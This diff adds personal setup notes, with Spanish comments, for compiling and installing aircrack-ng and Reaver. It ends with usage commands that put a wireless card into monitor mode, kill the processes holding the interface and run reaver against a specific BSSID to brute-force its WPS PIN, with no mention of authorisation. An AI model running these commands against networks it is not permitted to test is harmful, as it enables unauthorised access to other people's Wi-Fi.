@@ -1,0 +1,66 @@
+#Aircrack-ng
+
+sudo apt-get install libssl-dev
+
+#No esta en el repositorio, bajarlo y compilarlo
+wget http://download.aircrack-ng.org/aircrack-ng-1.1.tar.gz
+tar -zxvf aircrack-ng-1.1.tar.gz
+cd aircrack-ng-1.1
+
+make
+
+#Errores de compilación por variable inutilzada...
+
+#Los omitimos
+vi common.mak
+
+#Buscamos
+CFLAGS          ?= -g -W -Wall -Werror -O3
+
+#y eliminamos el Werror
+CFLAGS          ?= -g -W -Wall -O3
+
+make
+sudo make install
+
+sudo airodump-ng-oui-update
+
+#Al arrancar airmon-ng start wlan0 falla, solucion
+apt-get install iw
+
+
+#Reaver
+wget https://reaver-wps.googlecode.com/files/reaver-1.4.tar.gz
+tar -xzvf reaver-1.4.tar.gz
+
+#Requisitos
+sudo apt-get install libpcap-dev sqlite3 libsqlite3-dev libpcap0.8-dev
+
+#Compilar
+cd reaver-1.4
+cd src
+./configure
+make
+
+#Instalar
+sudo make install
+
+
+#USO
+airmon-ng start wlan0 
+
+#Si al arrancar el modo monitor nos informa de que hay procesos utilizando la interfaz wlan 
+Process with PID 3868 (ifplugd) is running on interface wlan0
+Process with PID 3884 (wpa_supplicant) is running on interface wlan0
+Process with PID 3979 (wpa_cli) is running on interface wlan0
+
+#hay que matarlos o el airodump se quedara bloqueado en el channel 1
+kill  3868
+kill  3884
+kill  3979
+
+#Luego ya podemos arrancar airodump-ng con normalidad
+airodump-ng mon0
+
+#Reaver
+reaver -i mon0 -b 72:3D:FF:EA:5E:18
